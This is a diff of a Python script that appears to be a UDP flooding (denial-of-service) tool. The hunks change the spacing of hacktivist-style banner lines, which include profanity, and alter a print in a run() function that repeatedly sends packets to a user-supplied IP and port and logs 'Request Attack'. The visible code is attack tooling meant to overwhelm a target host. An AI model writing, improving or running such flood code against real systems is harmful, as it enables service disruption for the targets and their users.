@@ -62,15 +62,15 @@ choice = str(input("\033[31m(y/n) :  \033[0m"))
 times = int(input("\033[96mTime : \033[0m"))
 threads = int(input("\033[92mThreads :  \033[0m"))
 time.sleep(5),
-print("\033[96m                ⟩⟩  ANTI RACIST \033[0m "),
+print("\033[96m               ⟩⟩  ANTI RACIST \033[0m "),
 time.sleep(5),
-print("\033[92m                ⟩⟩  ANTI TERRORIST \033[0m "),
+print("\033[92m               ⟩⟩  ANTI TERRORIST \033[0m "),
 time.sleep(5),
-print("\033[1m                ⟩⟩  ANTI OPPRESSION \033[0m "),
+print("\033[1m               ⟩⟩  ANTI OPPRESSION \033[0m "),
 time.sleep(5),
-print("\033[97m                ⟩⟩  ANTI GENOCIDE \033[0m "),
+print("\033[97m               ⟩⟩  ANTI GENOCIDE \033[0m "),
 time.sleep(5),
-print("\033[95m                ⟩⟩  FUCK U MURDER \033[0m "),
+print("\033[95m               ⟩⟩  FUCK U MURDER \033[0m "),
 time.sleep(5),
 
 def run():
@@ -82,7 +82,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print("\033[95m[\033[97m+\033[95m]   \033[94mRequest Attack  :. " +ip+ " \033[0m")
+			print(i+"\033[95m[\033[97m+\033[95m]   \033[94mRequest Attack  :. " +ip+ " \033[0m")
 		except:
 			print("\033[33m[\033[95m-\033[33m] Error!")
 
